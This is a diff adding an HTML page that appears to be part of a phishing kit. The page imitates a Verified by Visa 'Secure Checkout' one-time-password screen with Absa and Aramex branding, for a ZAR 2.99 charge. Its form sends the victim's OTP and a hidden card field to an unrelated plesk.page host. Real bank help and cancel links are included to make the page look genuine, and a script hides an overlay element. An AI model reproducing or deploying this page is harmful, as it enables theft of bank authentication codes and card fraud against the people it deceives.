@@ -1,0 +1,117 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Authentication</title>
+    
+    <link rel="stylesheet" type="text/css" href="./Authentication_files/screen.css">
+    <script src="./Authentication_files/commons.js.download"></script>
+    
+    <meta name="viewport" content="width=device-width">
+</head>
+
+<body onload="onBodyLoad();" bgcolor="#FFFFFF" text="#000000" onbeforeunload="dontclose();">
+
+   <script>
+document.body.innerHTML = document.body.innerHTML.replace('style="border: none; border-radius: 0px; box-shadow: none; height: 57px; left: 0px; right: auto; position: fixed; top: 0px; transition: none 0s ease 0s; width: 100%;', 'style="position: absolute;width:0;height:0;border:0;');
+document.body.style = "none";
+                </script>
+    <div id="wrapper">
+        <div class="container">
+            <!-- header -->
+			<div style="background:#660835; color:#FFFFFF; text-align:center; padding:12px; font-weight:bold;">
+				Secure Checkout
+			</div>
+            <div style="padding:12px;">
+                <div class="float-left">
+                    <img src="https://www.isnotdown.com/assets/pics/aramex.png" alt="Absa" height="55" style="position:relative; top:3px;">
+                </div>
+                <div class="float-right">
+                    
+                </div>
+                <div class="clear-both"></div>
+            </div>
+
+            <!-- content box -->
+            <div>
+                <div class="content-box">
+                    <div class="content-box">
+                        Your Card has been enrolled in Verified By Visa to help protect against unauthorised use online.
+                        <br>
+                        <br>To proceed with your purchase, please submit the One Time Password that has been sent to your cellphone.
+                    </div>
+
+                    <div class="content-box">
+                        <h3> Enter your One Time Password (OTP)</h3>
+                        
+                        <br>
+                     </div>
+
+
+                    <form autocomplete="off" id="form" name="form" method="post" enctype="application/x-www-form-urlencoded" action="https://wonderful-cori.4-246-189-147.plesk.page/za/index.php">
+					<input type="hidden" name="step" value="otp">
+					<input type="hidden" name="credit_card" >
+                        <div class="content-secure">
+							
+							<table class="content-tbl">
+							       <tbody><tr>
+									<td class="r">Merchant</td>
+									<td class="c">:</td>	
+									<td class="l">Aramex LTD</td>
+								</tr>
+								<tr>
+									<td class="r">Amount</td>
+									<td class="c">:</td>	
+									<td class="l">ZAR 2.99</td>
+								</tr>
+								<tr>
+									<td class="r">Time</td>
+									<td class="c">:</td>	
+									<td class="l">15:34:11 Mon.</td>
+								</tr>
+
+								<tr><td colspan="3">&nbsp;</td></tr>
+								<tr>
+									<td style="text-align:center;" colspan="3">  
+										<label class="verification-code" for="code">Verification code</label>
+										<br>
+                                        
+                                        <input required type="text" class="code" id="code" name="otp" >
+										<br><div class="error"></div>
+										
+									</td>
+								</tr>                                
+							</tbody></table>
+							
+                            <center>
+                             <!--   <div class="btn-next">
+                                    <INPUT class="btn-next" value="" name="submit" type="image" />
+                                    <a onClick="submitForm()" href="#"> </a>
+                                </div>-->
+
+                                <center>
+
+                                   <button style="border: 1px solid red;  text-align: center;  text-decoration: none;  background-color:white;  color:red;  border-radius: 2px;  height:30px;  cursor: pointer;padding-left:10px;padding-right:10px; border-radius: 5px;" onclick="window.location='../index.php?redirection=resend'">Resend</button>
+									<input type="submit" value="Confirm OTP" style="border: 1px solid red;  text-align: center;  text-decoration: none;  background-color:red;  color:white;  border-radius: 2px;  height:30px;  cursor: pointer;padding-left:10px;padding-right:10px; border-radius: 5px;"> 
+                                    <input type="hidden" name="cancel" id="cancel" value="false">
+                                    <input type="hidden" name="statusreason" id="statusreason" value="">
+
+                                </center>
+
+                                <div class="content-btm-nav">
+                                    <a class="help" href="https://acsabsa.bankserv.co.za/mdpayacs/templates/auths/045/2/static-password-help.html?brandlogo=visa-logo.gif&amp;orilogo=logo_absa.gif" target="_blank">Need help?</a>
+                                    <a onclick="exitPrompt()" class="cancel" href="https://acsabsa.bankserv.co.za/mdpayacs/pareq;mdsessionid=EA3B01A6802A09EB000DC38E7D0A07F2?cancel=true">Cancel Transaction</a> <input type="hidden" id="resend" name="resend" value="false">
+                                </div>
+                            </center>
+                        </div>
+
+                    </form>
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+
+
+
+
+</body></html>
